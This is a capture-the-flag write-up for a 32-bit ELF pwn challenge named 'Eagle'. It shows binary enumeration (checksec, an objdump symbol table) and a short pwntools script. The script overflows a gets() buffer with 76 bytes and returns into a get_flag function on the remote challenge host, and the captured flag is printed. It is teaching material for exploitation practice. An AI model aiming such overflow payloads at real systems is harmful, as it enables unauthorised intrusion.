## Eagle (Pwn, 125pts)  
# Enumeration
So we are on  the pwn category, so lets enumerate the binary.

**File Type**
```
shad3@zeroday:~/Desktop/Security/CTF/virsec$ file eagle 
eagle: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=a846d3f8892ac270e52ea0ce8d316fe15146d3a5, not stripped
```
**Security**
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
**Functions**
```
shad3@zeroday:~/Desktop/Security/CTF/virsec$ objdump -t eagle 

eagle:     file format elf32-i386

SYMBOL TABLE:
08048154 l    d  .interp        00000000              .interp
08048168 l    d  .note.ABI-tag  00000000              .note.ABI-tag
08048188 l    d  .note.gnu.build-id     00000000              .note.gnu.build-id
080481ac l    d  .gnu.hash      00000000              .gnu.hash
080481cc l    d  .dynsym        00000000              .dynsym
0804826c l    d  .dynstr        00000000              .dynstr
080482d6 l    d  .gnu.version   00000000              .gnu.version
080482ec l    d  .gnu.version_r 00000000              .gnu.version_r
0804830c l    d  .rel.dyn       00000000              .rel.dyn
08048324 l    d  .rel.plt       00000000              .rel.plt
0804834c l    d  .init  00000000              .init
08048370 l    d  .plt   00000000              .plt
080483d0 l    d  .plt.got       00000000              .plt.got
080483e0 l    d  .text  00000000              .text
08048704 l    d  .fini  00000000              .fini
08048718 l    d  .rodata        00000000              .rodata
08048854 l    d  .eh_frame_hdr  00000000              .eh_frame_hdr
080488a0 l    d  .eh_frame      00000000              .eh_frame
08049f04 l    d  .init_array    00000000              .init_array
08049f08 l    d  .fini_array    00000000              .fini_array
08049f0c l    d  .dynamic       00000000              .dynamic
08049ff4 l    d  .got   00000000              .got
0804a000 l    d  .got.plt       00000000              .got.plt
0804a020 l    d  .data  00000000              .data
0804a028 l    d  .bss   00000000              .bss
00000000 l    d  .comment       00000000              .comment
00000000 l    df *ABS*  00000000              crtstuff.c
08048440 l     F .text  00000000              deregister_tm_clones
08048480 l     F .text  00000000              register_tm_clones
080484c0 l     F .text  00000000              __do_global_dtors_aux
0804a028 l     O .bss   00000001              completed.7283
08049f08 l     O .fini_array    00000000              __do_global_dtors_aux_fini_array_entry
080484f0 l     F .text  00000000              frame_dummy
08049f04 l     O .init_array    00000000              __frame_dummy_init_array_entry
00000000 l    df *ABS*  00000000              eagle.c
00000000 l    df *ABS*  00000000              crtstuff.c
080489e0 l     O .eh_frame      00000000              __FRAME_END__
00000000 l    df *ABS*  00000000              
08049f08 l       .init_array    00000000              __init_array_end
08049f0c l     O .dynamic       00000000              _DYNAMIC
08049f04 l       .init_array    00000000              __init_array_start
08048854 l       .eh_frame_hdr  00000000              __GNU_EH_FRAME_HDR
0804a000 l     O .got.plt       00000000              _GLOBAL_OFFSET_TABLE_
08048700 g     F .text  00000002              __libc_csu_fini
08048430 g     F .text  00000004              .hidden __x86.get_pc_thunk.bx
0804a020  w      .data  00000000              data_start
00000000       F *UND*  00000000              fflush@@GLIBC_2.0
00000000       F *UND*  00000000              gets@@GLIBC_2.0
08048546 g     F .text  0000004f              vuln
080484f6 g     F .text  00000050              get_flag
0804a028 g       .data  00000000              _edata
08048704 g     F .fini  00000000              _fini
0804a020 g       .data  00000000              __data_start
00000000       F *UND*  00000000              puts@@GLIBC_2.0
00000000       F *UND*  00000000              system@@GLIBC_2.0
00000000  w      *UND*  00000000              __gmon_start__
0804a024 g     O .data  00000000              .hidden __dso_handle
0804871c g     O .rodata        00000004              _IO_stdin_used
00000000       F *UND*  00000000              __libc_start_main@@GLIBC_2.0
080486a0 g     F .text  0000005d              __libc_csu_init
00000000       O *UND*  00000000              stdin@@GLIBC_2.0
0804a02c g       .bss   00000000              _end
08048420 g     F .text  00000002              .hidden _dl_relocate_static_pie
080483e0 g     F .text  00000000              _start
08048718 g     O .rodata        00000004              _fp_hw
00000000       O *UND*  00000000              stdout@@GLIBC_2.0
0804a028 g       .bss   00000000              __bss_start
08048595 g     F .text  00000106              main
0804a028 g     O .data  00000000              .hidden __TMC_END__
0804834c g     F .init  00000000              _init
```
*080484f6 g     F .text  00000050              get_flag*
So from our enumeration we know that it's a x86 executable and that we dont have to spawn a shell 
all we have to do is redirect the execution flow to the get_flag function.

Since we dont have to spawn a shell we can solve this doing exploiting a classic buffer overflow and not a ret2libc attack.


Lets write a script to exploit it
```python
from pwn import *

p = remote('jh2i.com' ,50039)



bof = 'A' * 76
flag = p32(0x080484f6)


payload = bof + flag

p.recvuntil("Avast!")
p.send(payload)
p.recvline()
```
And it worked... 
```
shad3@zeroday:~/Desktop/Security/CTF/virsec$ python exploit.py
              |    |    |
             )_)  )_)  )_)
            )___))___))___)\
           )____)____)_____)\\
         _____|____|____|____\\\__
---------\                   /---------
  ^^^^^ ^^^^^^^^^^^^^^^^^^^^^
    ^^^^      ^^^^     ^^^    ^^
         ^^^^      ^^^

Avast!
LLS{if_only_eagle_would_buffer_overflow}
```
